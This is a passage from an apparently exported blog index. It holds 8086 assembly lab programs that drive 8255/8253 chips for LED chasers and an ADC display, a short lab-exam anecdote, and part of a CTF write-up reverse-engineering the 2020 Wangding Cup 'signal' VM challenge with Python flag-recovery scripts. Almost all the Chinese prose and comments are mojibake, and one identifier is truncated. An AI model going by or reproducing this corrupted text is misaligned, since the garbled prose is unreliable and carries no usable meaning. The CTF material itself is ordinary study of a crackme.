00H,10H,08H,03H,46H,21H,06H,0EH\nDATA ENDS\nCODE\tSEGMENT\n\tASSUME\tCS:CODE,DS:DATA\nSTART:\n\tMOV AX,DATA\n\tMOV DX,AX\n\tMOV DX,PORT_CTL\t\t;åˆå§‹åŒ–8255\n\tMOV AL,10010001B\t;Aå£è¾“å…¥ï¼Œè¯»å€¼ï¼ŒBå£è¾“å‡ºï¼Œæ‰“åˆ°æ•°ç ç®¡ï¼ŒCå£è¾“å…¥ï¼ŒPC0æ¥EOCåˆ¤æ–­ç”¨\n\tOUT DX,AL\nNEXT:\tMOV DX,280H\t\t;æŒ‡å‘ADCé€šé“0\n\tOUT DX,AL\t\t;å¯åŠ¨è½¬æ¢\n\tMOV DX,PORT_C\t\t;æŒ‡å‘8255çš„Cå£\nPOLL:\n\tIN AL,DX\t\t;è¯»Cå£å€¼\n\tTEST AL,01H\t\t;æµ‹è¯•PC0æ˜¯å¦ä¸º1\n\tJZ POLL\t\t\t;æ˜¯0ï¼Œè½¬æ¢æœªç»“æŸï¼Œç»§ç»­ç­‰å¾…\n\tMOV AL,10000000B\n\tMOV DX,PORT_C\n\tOUT DX,AL\n\tMOV DX,280H\t\t;æ˜¯1ï¼Œè½¬æ¢ç»“æŸï¼ŒæŒ‡å‘ADCé€šé“0\n\tIN AL,DX\t\t;è¯»å–è½¬æ¢åæ•°æ®\t\t\n\tAND AL,0FH\t\t;å–ä½4ä½\n\tMOV BX,OFFSET TUBE\t;æŒ‡å‘æ•°ç ç®¡è¡¨\n\tXLAT\n\tNOT AL\t\t\t;å–å\n\tMOV DX,PORT_B\t\t;æŒ‡å‘8255çš„Bå£\n\tOUT DX,AL\t\t;å°†ä½4ä½å€¼æ˜¾ç¤ºåœ¨æ•°ç ç®¡ä¸Š\n\tMOV BX,15\nDELAY:\t\t\t\t;åŒé‡å»¶æ—¶\n\tMOV CX,0FFFFH\nDELAY1:\n\tLOOP DELAY1\n    \tDEC BX\n\tJNZ DELAY\n\tMOV AL,01000000B\n\tMOV DX,PORT_C\n\tOUT DX,AL\n\tMOV DX,280H\t\t;å»¶æ—¶ç»“æŸåï¼Œå†æŒ‡å›ADCçš„é€šé“0\n\tIN AL,DX\t\t;å†è¯»ä¸€æ¬¡æ•°æ®\n\tAND AL,0F0H \t\t;å–é«˜4ä½\n\tMOV CL,4\n\tROR AL,CL\n\tMOV BX,OFFSET TUBE\t;æŒ‡å‘æ•°ç ç®¡è¡¨\n\tXLAT\n\tNOT AL\t\t\t;å–å\n\tMOV DX,PORT_B\t\t;æŒ‡å‘8255çš„Bå£\n\tOUT DX,AL\t\t;å°†é«˜4ä½å€¼æ˜¾ç¤ºåœ¨æ•°ç ç®¡ä¸Š\n\tMOV BX,15\t\nDELAY2:\t\t\t\t;å†æ¬¡åŒé‡å»¶æ—¶\n\tMOV CX,0FFFFH\nDELAY3:\n\tLOOP DELAY3\n    \tDEC BX\n\tJNZ DELAY2\n\tJMP NEXT\t\t;å»¶æ—¶ç»“æŸï¼Œè·³å›NEXTï¼Œè¿›è¡Œä¸€ä¸‹è½®å®ç°\nCODE ENDS\n\tEND START\n```\n\n------\n\n## 0x03 å®ç°å·¦å³è½®å¾ªç¯è·‘é©¬ç¯\n\nåˆ©ç”¨8253æä¾›å®šæ—¶æ—¶é—´ï¼ˆ2ç§’ï¼‰ï¼Œ8255è¾“å‡ºè‡³å‘å…‰äºŒæç®¡ï¼Œæ˜¾ç¤ºè¦æ±‚ä¸ºï¼šä»å·¦å‘å³ç§»ä½æ˜¾ç¤ºä¸€æ¬¡å¾ªç¯ï¼Œç„¶åä»å³å‘å·¦ç§»ä½æ˜¾ç¤ºä¸€æ¬¡å¾ªç¯ã€‚8253æ§åˆ¶å£åœ°å€283Hï¼Œ8255æ§åˆ¶å£åœ°å€293Hã€‚\n\n\n\n```assembly\nORT_A EQU 290H\t\t\t;8255Aå£åœ°å€\nPORT_B EQU 291H\t\t\t;8255Bå£åœ°å€\nPORT_C EQU 292H\t\t\t;8255Cå£åœ°å€\nPORT_CTL EQU 293H\t\t;8255æ§åˆ¶å£åœ°å€\n\nPORT_1 EQU 280H\nPORT_2 EQU 281H\nPORT_3 EQU 282H\nPORT_CTL2 EQU 283H\n\nSTACK SEGMENT STACK\n\tDB 50 DUP(?)\nTOP_S\tLABEL WORD\nSTACK ENDS\n\nCODE SEGMENT\n\tASSUME CS:CODE,SS:STACK\n\nSTART:\n\tMOV AX,STACK\n\tMOV SS,AX\n\tLEA SP,TOP_S\n\n\tMOV AL,00110101B\t;8253çš„é€šé“0ï¼Œå…ˆé€ä½å­—èŠ‚ï¼Œå†é€é«˜å­—èŠ‚ï¼Œæ–¹å¼2ï¼ŒBCDç \n\tMOV DX,PORT_CTL2\n\tOUT DX,AL\t\t;8253åˆå§‹åŒ–\n\tMOV AL,00H\t\t;å‘8253çš„é€šé“0ï¼ŒN0èµ‹5000\n\tMOV DX,PORT_1\n\tOUT DX,AL\n\tMOV AL,50H\n\tMOV DX,PORT_1\n\tOUT DX,AL\t\t\n\n\tMOV AL,01110111B\t;8253çš„é€šé“1ï¼Œå…ˆé€ä½å­—èŠ‚ï¼Œå†é€é«˜å­—èŠ‚ï¼Œæ–¹å¼3ï¼ŒBCDç \n\tMOV DX,PORT_CTL2\n\tOUT DX,AL\t\t;8253åˆå§‹åŒ–\n\tMOV AL,00H\t\t;å‘8253çš„é€šé“1ï¼ŒN1èµ‹800\n\tMOV DX,PORT_2\n\tOUT DX,AL\n\tMOV AL,08H\t\t\n\tMOV DX,PORT_2\n\tOUT DX,AL\n\t\n\tMOV DX,PORT_CTL\t\t;8255åˆå§‹åŒ–\n\tMOV AL,10011001B\t;Bç«¯å£è¾“å‡º,Aç«¯å£æ§åˆ¶è¾“å…¥,Cç«¯å£å»¶æ—¶è¾“å…¥\n\tOUT DX,AL\n\tMOV AL,10000000B\t;å…ˆäº®æœ€å·¦è¾¹çš„ç¯\n\tPUSH AX\t\t\t;å‹æ ˆ\n\nTEST1:\t\n\tMOV DX,PORT_B\t\t;Bå£è¾“å‡º\n\tPOP AX\t\t\t;ALå‡ºæ ˆ\n\tOUT DX,AL\n\tPUSH AX\t\t\t;å°†æ­¤æ—¶çš„ALå†å‹æ ˆ\n\n\tcmp AL,00000001B\t;çœ‹æœ‰æ²¡æœ‰åˆ°å³è¾¹\n\tJZ TEST2\t\t;åˆ°å³è¾¹äº†å³è·³åˆ°test2\n\nDELAY1:\t\t\t\t;å»¶æ—¶\n\tMOV DX,PORT_C\n\tIN AL,DX\n\tAND AL,00000001B\t;å–PC0\n\tCMP AL,00000001B\n\tJZ DELAY1\t\t;ä½ç”µå¹³è·³å‡º\nDELAY2:\n\tIN AL,DX\n\tAND AL,00000001B\t;å–PC0\n\tCMP AL,00000001B\n\tJNZ DELAY2\t\t;é«˜ç”µå¹³è·³å‡º\n\t\n\n\tPOP AX\t\t\t;ALå‡ºæ ˆ\n\tROR AL,01\t\t;å¾ªç¯å³ç§»\n\tPUSH AX\t\t\t;ALå†å‹æ ˆ\n\tJMP TEST1\t\t;è¿”å›TEST1\n\nTEST2:\t\n\tMOV DX,PORT_B\t\t\n\tPOP AX\t\t\t;æ­¤æ—¶AL=00000001B\n\tOUT DX,AL\t\t;äº®æœ€å³è¾¹çš„ç¯\n\tPUSH AX\t\t\t\n\tCMP AL,10000000B\t;çœ‹æ˜¯å¦äº®åˆ°äº†æœ€å·¦è¾¹çš„ç¯\n\tJZ TEST1\t\t;æ˜¯ï¼Œè·³å›TEST1\n\nDELAY3:\n\tMOV DX,PORT_C\n\tIN AL,DX\n\tAND AL,00000001B\t;å–PC0\n\tCMP AL,00000001B\n\tJZ DELAY3\t\t;ä½ç”µå¹³è·³å‡º\nDELAY4:\n\tIN AL,DX\n\tAND AL,00000001B\t;å–PC0\n\tCMP AL,00000001B\n\tJNZ DELAY4\t\t;é«˜ç”µå¹³è·³å‡º\n\t\n\n\tPOP AX\n\tROL AL,01\t\t;å¾ªç¯å·¦ç§»\n\tPUSH AX\n\tJMP TEST2\n\nCODE ENDS\n\tEND START\n```\n\n------\n\n## 0x04è®°å¾®æœºå®éªŒè€ƒè¯•\n\n> è¦æ±‚ï¼šåˆ©ç”¨8253æä¾›å®šæ—¶æ—¶é—´ï¼ˆ1ç§’ï¼‰ï¼Œ8255è¾“å‡ºä¸ºè·‘é©¬ç¯å½¢å¼è‡³å‘å…‰äºŒæç®¡ã€‚æ˜¾ç¤ºè¦æ±‚ä¸ºä»å·¦å‘å³æ¯æ¬¡ç§»2ä½å¾ªç¯4æ¬¡ï¼Œç„¶åä»¥8253ä»¥2ç§’å»¶æ—¶ä»å³å‘å·¦æ¯æ¬¡ç§»1ä½å¾ªç¯5æ¬¡åç¯å…¨\n> äº®ååœæ­¢ã€‚æ§åˆ¶è·‘é©¬ç¯æš‚åœé”®ä¸ºK4é”®ï¼Œå½“K4é”®ä½æ—¶æš‚åœã€‚\n> 8253 æ§åˆ¶å£åœ°å€ 2A3H,8255A å£åœ°å€ 2B0Hã€‚\n\næ‹¿åˆ°é¢˜ç›®çš„ä¸€ç¬é—´å…¨ç»„ç‹‚å–œï¼Œ\n\nå¾ˆç®€å•ï¼Œ8255ã€8253ä¸¤ä¸ªèŠ¯ç‰‡ï¼Œä¸¤ä¸ªç¡¬å»¶æ—¶å°±å¯ä»¥äº†\n\nä½†æ˜¯ä¸€ä¸ªçœ‹ä¼¼ä¸‰ååˆ†é’Ÿç¨‹åºå´åšäº†å°†è¿‘ä¸€ä¸ªåŠå°æ—¶ï¼Œäº‹æƒ…æ˜¯è¿™æ ·çš„\n\nåœ¨å†™å®Œç¬¬ä¸€ä¸ªå»¶æ—¶åï¼Œæœ¬æƒ³å…ˆæµ‹è¯•ä¸€ä¸‹æ•ˆæœï¼Œä½†æ­£å¸¸æµ‹è¯•å‡ æ¬¡åLEDç¯çªç„¶å°±ä¸äº®äº†\n\nï¼Ÿï¼Ÿï¼Ÿç–‘æƒ‘ï¼Œç ”ç©¶äº†å¥½ä¹…ï¼Œå†™äº†ç¨‹åºæµ‹è¯•å°ç¯ã€æ¢çº¿ï¼Œæœ€åç›´æ¥5væ¥ä¸Šï¼Œè¿˜æ˜¯ä¸è¡Œ\n\nè€Œä¸”å°ç¯çš„è¿·æƒ‘è¡Œä¸ºæ­¢ä¸äº®è¿™ä¹ˆç®€å•ï¼Œå®ƒçš„äº®ç­éšæœºçš„ï¼Œä¸æ–­è°ƒæ•´çº¿çš„ä½ç½®å¹¶ä¸”åˆ†æç¯çš„äº®ç­è§„å¾‹æˆ‘ä»¬æ–­å®šâ€”â€”ç®±å­åäº†\n\næ²¡åŠæ³•ï¼Œæ‰¾è€å¸ˆï¼Œè€å¸ˆç„äº†ä¸€çœ¼ï¼Œâ€œçº¿æœ‰é—®é¢˜ï¼Œæ¢çº¿å°±å¥½......â€\n\nå¿ƒæ€å´©äº†ï¼Œæ˜çŸ¥é“æ¢çº¿è¡Œä¸é€šï¼Œåˆä¸å¥½æ„æ€è®©è€å¸ˆæ¥å¸®å¿™æ‰¾é—®é¢˜ï¼Œæ²¡åŠæ³•è‡ªå·±æ¥å§\n\nå°±è¿™æ ·ä¼°è®¡åŠä¸ªå°æ—¶è¿‡å»äº†ï¼Œçªç„¶è„è„è°ƒçº¿çš„æ—¶å€™åŠ¨äº†ä¸€ä¸‹ç”µæºæ’å¤´\n\nï¼ï¼ï¼ï¼ç¯äº®äº†ï¼Œç«Ÿç„¶æ²¡æƒ³è¿‡æ˜¯ç”µæºæ¥è§¦çš„é—®é¢˜\n\næ‰“æ‰°äº†ï¼Œé—®é¢˜è§£å†³å\n\næ¥ç€å¾ˆå¿«ä»£ç å®Œæˆï¼Œåº”è¯¥æ˜¯ç¬¬ä¸€ç»„å®Œæˆ\n\n```assembly\nCODE SEGMENT\nASSUME CS:CODE\nSTART:\nMOV DX,2B3H ;åˆå§‹åŒ–8255\nMOV AL,10010010B\nOUT DX,AL\nMOV AL,80H ;æš‚å­˜ç¬¬8ä¸ªç¯ï¼Œä¿è¯èµ·å§‹ç¯äº®\nMOV AH,AL\nMOV BX,4\nTEST1:\n;ç¬¬ä¸€çº§é€šé“0ï¼Œæ–¹å¼2ï¼Œå…ˆå†™ä½å­—èŠ‚ï¼Œåå†™é«˜å­—èŠ‚\nMOV AL ,00110101B\nMOV DX ,2A3H\nOUT DX,AL\nMOV AL,00H;è®¡æ•°åˆå€¼5000\nMOV DX ,2A0H\nOUT DX,AL\nMOV AL,50H\nOUT DX,AL\n;ç¬¬äºŒçº§é€šé“1ï¼Œæ–¹å¼3ï¼Œå…ˆå†™ä½å­—èŠ‚ï¼Œå†å†™é«˜å­—èŠ‚\nMOV AL,01110111B\nMOV DX,2A3H\nOUT DX,AL\nMOV AL,00H;åˆå€¼400\nMOV DX,2A1H\nOUT DX,AL\nMOV AL,08H\nOUT DX,AL\n;è„‰å†²2MHzï¼Œå‘¨æœŸ2s\nTEST0:\nMOV DX,2B1H ;åˆ¤æ–­æ˜¯å¦æ˜¯å¼€å…³K4\nIN AL,DX\nTEST AL,10H\nJZ TEST0\nT3:\nMOV AL,AH\nMOV DX,2B2H\nOUT DX,AL;è¾“å‡ºåˆ°Cå£\nROR AL,2;å³ç§»ä¸¤ä½\nMOV AH,AL;æš‚å­˜å½“å‰ç¯çš„ä½ç½®\nT4:         \nMOV DX,2B0H     ;å»¶æ—¶\nIN AL,DX\nTEST AL,01H\nJNZ T4\nDEC BX\nJNZ TEST1\n\nMOV BX,5\nTESTA:\n;ç¬¬ä¸€çº§é€šé“0ï¼Œæ–¹å¼2ï¼Œå…ˆå†™ä½å­—èŠ‚ï¼Œåå†™é«˜å­—èŠ‚\nMOV AL ,00110101B\nMOV DX ,2A3H\nOUT DX,AL\nMOV AL,00H;è®¡æ•°åˆå€¼5000\nMOV DX ,2A0H\nOUT DX,AL\nMOV AL,50H\nOUT DX,AL\n;ç¬¬äºŒçº§é€šé“1ï¼Œæ–¹å¼3ï¼Œå…ˆå†™ä½å­—èŠ‚ï¼Œå†å†™é«˜å­—èŠ‚\nMOV AL,01110111B\nMOV DX,2A3H\nOUT DX,AL\nMOV AL,00H;åˆå€¼400\nMOV DX,2A1H\nOUT DX,AL\nMOV AL,16H\nOUT DX,AL\n;è„‰å†²2MHzï¼Œå‘¨æœŸ4s\n\nTESTB:\nMOV DX,2B1H ;åˆ¤æ–­æ˜¯å¦æ˜¯å¼€å…³K4\nIN AL,DX\nTEST AL,10H\nJZ TESTB\nMOV AL,AH\nMOV DX,2B2H\nOUT DX,AL;è¾“å‡ºåˆ°Cå£\nROL AL,1;å·¦ç§»ä¸€ä½\nMOV AH,AL;æš‚å­˜å½“å‰ç¯çš„ä½ç½®\nTC:         \nMOV DX,2B0H     ;å»¶æ—¶\nIN AL,DX\nTEST AL,01H   \nJNZ TC\nDEC BX\nJNZ TESTA\nLOOP1:\nMOV AL,0FFH \nMOV DX,2B2H\nOUT DX,AL;è¾“å‡ºåˆ°Cå£\nJMP LOOP1\n\nCODE ENDS\nEND START\n```\n\né—æ†¾çš„æ˜¯è€å¸ˆç«Ÿç„¶æ²¡é—®æˆ‘ä»€ä¹ˆé—®é¢˜ï¼Œ\n\næ€»çš„æ¥è¯´è€ƒè¯•è¿˜ç®—é¡ºåˆ©ï¼Œæ”¶æ‹¾ä¹¦åŒ…èµ°äºº...\n\n## 0x05 å°ç»“\n\nä»ç¬¬ä¸€æ¬¡æ¥è§¦æ±‡ç¼–åˆ°ç°åœ¨ä¹Ÿç®—æœ‰ç‚¹æ”¶è·ï¼Œè™½ç„¶åªæ˜¯ä¸€äº›çš®æ¯›\n\nä½†å­¦ä¹ äºŒè¿›åˆ¶ä»¥åè¿˜ä¼šç»å¸¸å’Œæ±‡ç¼–æ‰“äº¤é“ï¼Œç°åœ¨æ··ä¸ªè„¸ç†Ÿï¼Œå°†æ¥æ…¢æ…¢æ·±å…¥äº†è§£ä¹Ÿä¸è¿Ÿ\n\næš‚æ—¶å‘Šåˆ«èŠ¯ç‰‡å’Œç®±å­ï¼Œæˆ‘ä¼šæƒ³ä½ çš„ï¼Œï¾‰Bye~","tags":["Assembly"],"categories":["DEVELOP"]},{"title":"2020 ç½‘é¼æ¯_signal","url":"/2020/06/14/signal/","content":"\n# 0x00 å‰è¨€\n\nä¹‹å‰ç½‘é¼æ¯çš„é€†å‘é¢˜ï¼Œè¯´å®è¯ï¼Œè¿™æ˜¯æˆ‘ç¬¬ä¸€æ¬¡è§è™šæ‹Ÿæœºçš„é€†å‘\n\nç°åœ¨å·²ç»æ·±å¤œäº†ï¼Œå®³æ€•ç¬¬äºŒå¤©å°±å¿˜äº†ï¼Œæ‰€ä»¥èµ¶ç´§è®°ä¸‹æ¥\n\n------\n\nå·²ç»ç¬¬äºŒå¤©äº†ï¼Œåˆšåˆšå†™å‡ºè„šæœ¬ï¼Œå›æ¥æ¥ç€å†™\n\nè¯´å®è¯ç¬¬ä¸€æ¬¡è§è™šæ‹Ÿæœºçš„é¢˜ç›®è¿˜æŒºæœ‰æ–°é²œæ„Ÿçš„\n\nä¸è¿‡çœŸæ­£åƒé€ä¸€é“é¢˜ä¹Ÿä¸å®¹æ˜“ï¼ˆè¿˜æ˜¯è‡ªå·±å¤ªèœï¼‰\n\næœ¬é¢˜ä¸‰ç§è§£æ³•æˆ‘äº†è§£çš„å·®ä¸å¤šäº†ï¼Œå½“ä½œç¬”è®°å¥½å¥½è®°å½•ä¸€ä¸‹\n\n------\n\n## 0x01 ç¨‹åºåˆ†æ\n\nä¸»å‡½æ•°ï¼š\n\n```c\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\n  int v4; // [esp+18h] [ebp-1D4h]\n\n  __main();\n  qmemcpy(&v4, &unk_403040, 0x1C8u);\n  vm_operad(&v4, 114);\n  puts(\"good,The answer format is:flag {}\");\n  return 0;\n}\n```\n\nä¸ç®¡åˆ«çš„ï¼ŒæŠŠ`&unk_403040`çš„å€¼æ‰£ä¸‹æ¥å†è¯´\n\n\n\n![](https://i.loli.net/2020/06/14/TWOQHMdemzoRqYb.png)\n\nä¸»å‡½æ•°åšçš„æ˜¯å…ˆæŠŠ`&unk_403040`çš„å€¼èµ‹ç»™`&v4`ï¼Œç„¶åè¿›å…¥`vm_operad`å‡½æ•°\n\n```c\nint __cdecl vm_operad(int *a1, int a2)\n{\n  int result; // eax\n  char v3[100]; // [esp+13h] [ebp-E5h]\n  char v4[100]; // [esp+77h] [ebp-81h]\n  char v5; // [esp+DBh] [ebp-1Dh]\n  int v6; // [esp+DCh] [ebp-1Ch]\n  int v7; // [esp+E0h] [ebp-18h]\n  int v8; // [esp+E4h] [ebp-14h]\n  int v9; // [esp+E8h] [ebp-10h]\n  int v10; // [esp+ECh] [ebp-Ch]\n\n  v10 = 0;\n  v9 = 0;\n  v8 = 0;\n  v7 = 0;\n  v6 = 0;\n  while ( 1 )\n  {\n    result = v10;\n    if ( v10 >= a2 )\n      return result;\n    switch ( a1[v10] )\n    {\n      case 1:\n        v4[v7] = v5;\n        ++v10;\n        ++v7;\n        ++v9;\n        break;\n      case 2:\n        v5 = a1[v10 + 1] + v3[v9];\n        v10 += 2;\n        break;\n      case 3:\n        v5 = v3[v9] - LOBYTE(a1[v10 + 1]);\n        v10 += 2;\n        break;\n      case 4:\n        v5 = a1[v10 + 1] ^ v3[v9];\n        v10 += 2;\n        break;\n      case 5:\n        v5 = a1[v10 + 1] * v3[v9];\n        v10 += 2;\n        break;\n      case 6:\n        ++v10;\n        break;\n      case 7:\n        if ( v4[v8] != a1[v10 + 1] )\n        {\n          printf(\"what a shame...\");\n          exit(0);\n        }\n        ++v8;\n        v10 += 2;\n        break;\n      case 8:\n        v3[v6] = v5;\n        ++v10;\n        ++v6;\n        break;\n      case 10:\n        read(v3);\n        ++v10;\n        break;\n      case 11:\n        v5 = v3[v9] - 1;\n        ++v10;\n        break;\n      case 12:\n        v5 = v3[v9] + 1;\n        ++v10;\n        break;\n      default:\n        continue;\n    }\n  }\n}\n```\n\nç¬¬ä¸€æ¬¡è§ï¼Œæ„Ÿè§‰è¿™ä¹ˆå¤šæ•°ä¸€å®šå¾ˆéº»çƒ¦ï¼Œä½†å…¶å®å¦‚æœç†è§£äº†å…¶ä¸­çš„æ“ä½œå¹¶ä¸éš¾\n\nç²—ç•¥çš„çœ‹ä¸€ä¸‹ï¼Œæœ‰ what a shame è¿™æ ·çš„å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥åº”è¯¥æ˜¯è¦æ¯”è¾ƒå­—ç¬¦\n\nå†ä»”ç»†åˆ†æç¨‹åºï¼Œswitch è¿™é‡Œç”¨çš„å‚æ•°æ˜¯ a1ï¼ˆ0x403040çš„å€¼ï¼‰ï¼Œv10 ç›¸å½“äºæ˜¯ç´¢å¼•ï¼Œä»0å¼€å§‹é€’å¢ï¼Œ\n\nè¿›è€Œéå† 0x403040ä¹‹åçš„æ‰€æœ‰æ•°ï¼ˆå››å­—èŠ‚ä¸ºå•ä½ï¼‰ã€‚\n\næ‰€ä»¥è¯´ 0x403040 è¿™é‡Œé¢å‚¨å­˜çš„éƒ½æ˜¯æ“ä½œæ•°ï¼Œç„¶åä¸€ä¸ªä¸€ä¸ªå–å‡ºæ¥ï¼Œæ‰¾ç›¸åº”çš„caseè¿›è¡Œæ“ä½œã€‚\n\n##ç‰¹åˆ«è¦æ³¨æ„çš„æ˜¯case7ï¼Œæ“ä½œç æœ€åéƒ¨åˆ†çš„07Héƒ½æ˜¯è¿›è¡Œæ¯”è¾ƒç”¨çš„\n\n![image-20200614135000672](https://i.loli.net/2020/06/14/2mfMaRsH1nxLw5e.png)\n\n------\n\næ¥ä¸‹æ¥åªè¦æ ¹æ®ç›¸åº”çš„æ“ä½œæ•°ä¸€æ­¥ä¸€æ­¥åˆ†æï¼Œ\n\né¦–å…ˆé€šè¿‡åˆ†æçŸ¥é“ï¼Œa1æ˜¯å­˜å…¥çš„æ“ä½œæ•°ï¼Œv3æ˜¯ä½ è¾“å…¥çš„å­—ç¬¦ï¼Œv4ï¼Œv5ç”¨äºæš‚å­˜æ•°æ®\n\n```c\ncase1ï¼šè¿›è¡Œèµ‹å€¼æ“ä½œï¼Œå°†v5çš„å€¼èµ‹ç»™v4ï¼Œæ ‡å·ç´¢å¼•å…¨åŠ 1  \n//åé¢å¯ä»¥çŸ¥é“v4å†…æ•°æ®ç”¨æ¥ä½œæœ€åçš„æ¯”è¾ƒ\ncase2ï¼šv3ä¸a1çš„ä¸‹ä¸€ä¸ªå€¼ç›¸åŠ ï¼Œç´¢å¼•åŠ 2ï¼ˆè·³è¿‡ç”¨äºè¿ç®—çš„æ•°å€¼ï¼‰\ncase3ï¼šv3å‡å»a1çš„ä¸‹ä¸€ä¸ªå€¼ï¼Œç´¢å¼•åŠ 2\ncase4ï¼ša1çš„ä¸‹ä¸€ä¸ªæ•°å€¼ä¸v3å¼‚æˆ–ï¼Œç´¢å¼•åŠ 2\ncase5ï¼ša1ä¸‹ä¸€ä¸ªæ•°å€¼ä¸v3ç›¸ä¹˜ï¼Œç´¢å¼•åŠ 2\ncase6ï¼šç©ºæ“ä½œ\ncase7ï¼šv4çš„æ•°å€¼åˆ†åˆ«ä¸a1çš„ä¸‹ä¸€ä¸ªæ•°å€¼è¿›è¡Œæ¯”è¾ƒï¼Œå…¨æ­£ç¡®åˆ™é€šè¿‡\ncase8ï¼šç›¸å½“äºä¸€ä¸ªå¤åˆ¶æ“ä½œï¼Œä¿å­˜å½“å‰å€¼\ncase9ï¼šåˆšå‘ç°æ²¡æœ‰case9\ncase10ï¼šè¾“å…¥15ä½æ•°å€¼ï¼Œæ”¾åœ¨v3ä¸­\ncase11ï¼šv3-1\ncase12ï¼šv3+1\n```\n\näº†è§£äº†å…¨éƒ¨æ“ä½œï¼Œé‚£ä¹ˆå°±å¯ä»¥åˆ†æå®ƒçš„å®ç°æµç¨‹äº†\n\n## 0x02 å®ç°æµç¨‹\n\nå¯¹ç…§ç€`0x403040`çš„æ•°æ®å¯ä»¥ä¸€æ­¥ä¸€æ­¥æ‘¸æ¸…å®ƒçš„è„‰ç»œ\n\né¦–å…ˆç¬¬ä¸€ä¸ªæ“ä½œç æ˜¯10ï¼Œæ˜¯è¾“å…¥15ä½æ•°æ®ï¼ˆä¹Ÿå°±æ˜¯è¦æ±‚çš„flagï¼‰\n\nä¸‹ä¸€ä¸ªæ“ä½œç æ˜¯4ï¼Œflag[0]ä¸a1çš„ä¸‹ä¸€ä¸ªæ•°å€¼ï¼ˆ16ï¼‰è¿›è¡Œå¼‚æˆ–ï¼Œç´¢å¼•åŠ 2\n\nä¸‹ä¸€ä¸ªæ“ä½œç æ˜¯8ï¼Œä¿å­˜å½“å‰çŠ¶æ€ã€‚\n\nä¸‹ä¸€ä¸ªæ“ä½œç æ˜¯3ï¼Œå½“å‰å€¼å‡å»a1ä¸‹ä¸€ä¸ªæ•°æ®ï¼ˆ5ï¼‰\n\nä¸‹ä¸€ä¸ªæ“ä½œç æ˜¯1ï¼Œå°†ç°åœ¨çš„æ•°æ®èµ‹å€¼ç»™v4ï¼Œå„ä¸ªç´¢å¼•å‡åŠ 1\n\nè¿›è¡Œå¯¹ä¸‹ä¸€ä½flag[1]çš„è¿ç®—æ“ä½œ\n\næ‰€ä»¥å¯ä»¥ä»ä¸­æ‰¾å‡ºè§„å¾‹ï¼Œå¯¹äºæ¯ä¸€ä½æ•°æ®çš„æ“ä½œéƒ½ç»“æŸäºcase1ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œç¨‹åºæ˜¯å°†flag[0~14]è¿™15ä½æ•°æ®ä¾æ¬¡ä½œè¿ç®—ï¼Œå­˜å…¥v4ä¸­ï¼Œæœ€åå°†v4çš„æ•°å€¼åˆ†åˆ«ä¸å¯¹åº”çš„æ•°å€¼è¿›è¡Œæ¯”è¾ƒ\n\n------\n\n## 0x03 è„šæœ¬\n\n**1.æ‰‹æ’•ç¨‹åº**\n\né‚£ä¹ˆå¯ä»¥åŠ¨ç¬”æ¥ç®—ä¸€ä¸‹ï¼Œ~~å†™çš„æœ‰ç‚¹ä¹±ï¼Œæ— ä¼¤å¤§é›…ï¼Œå‹‰å¼ºèƒ½å†²~~ã€‚\n\n![image-20200614133839058](https://i.loli.net/2020/06/14/vFeAPrMR5ZzUtc8.png)\n\nç”±äºé¢˜ç›®çš„ä½æ•°ä¸å¤šï¼Œé€»è¾‘ä¸éš¾ï¼Œæ‰€ä»¥æ‰‹æ’•è¿˜æ˜¯æŒºå¿«~~ï¼ˆä¹ï¼‰~~çš„ï¼Œè´´ä¸Šä»£ç \n\n\n\n```python\nprint (chr((34+5)^16),end='')\nprint (chr((63//3)^32),end='')\nprint (chr(52+2+1),end='')\nprint (chr((50^4)-1),end='')\nprint (chr((114+33)//3),end='')\nprint (chr(51+1+1),end='')\nprint (chr((24+32)^9),end='')\nprint (chr((167^36)-81),end='')\nprint (chr(49+1-1),end='')\nprint (chr((241-37)//2),end='')\nprint (chr((40^65)-54),end='')\nprint (chr(132-32),end='')\nprint (chr((193-37)//3),end='')\nprint (chr((30+32)^9),end='')\nprint (chr(122-1-65))\n\n##ç–¯ç‹‚printï¼Œè™½ç„¶çœ‹ä¸Šå»å¾ˆlowï¼Œä½†ç®€å•ç²—æš´ï¼Œæ•ˆç‡å¾ˆé«˜\n```\n\n**2.~~é«˜çº§~~è„šæœ¬**\n\nåŸºæœ¬çš„é€†å‘æ€ç»´\n\n![image-20200614145058127](https://i.loli.net/2020/06/14/udbCneJyRa9hYHN.png)\n\næ‰¾å‡ºv4çš„å€¼ï¼Œåˆ†åˆ«åå‘åšé€†è¿ç®—å°±å¯ä»¥æ‰¾å‡ºflag\n\n```python\nv4 = [34,63,52,50,114,51,24,167,49,241,40,132,193,30,122]\nv4.reverse()\na=[10, 4, 16, 8, 3, 5, 1, 4, 32, 8, 5, 3, 1, 3, 2, 8, 11, 1, 12, 8, 4, 4, 1, 5, 3, 8, 3, 33, 1, 11, 8, 11, 1, 4, 9, 8, 3, 32, 1, 2, 81, 8, 4, 36, 1, 12, 8, 11, 1, 5, 2, 8, 2, 37, 1, 2, 54, 8, 4, 65, 1, 2, 32, 8, 5, 1, 1, 5, 3, 8, 2, 37, 1, 4, 9, 8, 3, 32, 1, 2, 65, 8, 12, 1]\na.reverse()\nv9=0\nv3=0#flag\nv5=0\nflag=[]\nfinal=''\nfor i in range(0,len(a)):\n    if i ==len(a)-1:\n        flag.append(v3)                   \n    if a[i]==1 and a[i-1]!=1:\n        v5 = v4[v9]\n        v9+=1\n        flag.append(v3)                    \n    if a[i]==2:\n        v3 = v5 - a[i-1]\n    if a[i]==3:\n        v3 = v5 + a[i-1] \n    if a[i]==4:                  \n        v3 = v5^a[i-1]\n    if a[i]==5:                 \n        v3 = int(v5/a[i-1])\n    if a[i]==8:\n        v5 = v3                            \n    if a[i]==11:\n        v3 = v5+1\n    if a[i]==12:\n        v3 = v5-1\nflag.reverse()\nfor j in flag:\n    final +=chr(j)\nprint (final)\n#çœ‹ä¸Šå»å¾ˆé«˜çº§ï¼Œä½†....æœ‰è¿™ä¸ªæ—¶é—´æ‰‹ç®—ä¸é¦™å—\n```\n\nä¸ºäº†å†™çš„é€šä¿—æ˜“æ‡‚ï¼Œè„šæœ¬å¯èƒ½ä¼šå­˜åœ¨è€ƒè™‘ä¸å‘¨çš„åœ°æ–¹ï¼Œä¸è¿‡è§£å‡ºæœ¬é¢˜è¿˜æ˜¯å¯ä»¥çš„\n\né™„ä¸Šé˜Ÿé‡Œä¸€ä½[Han 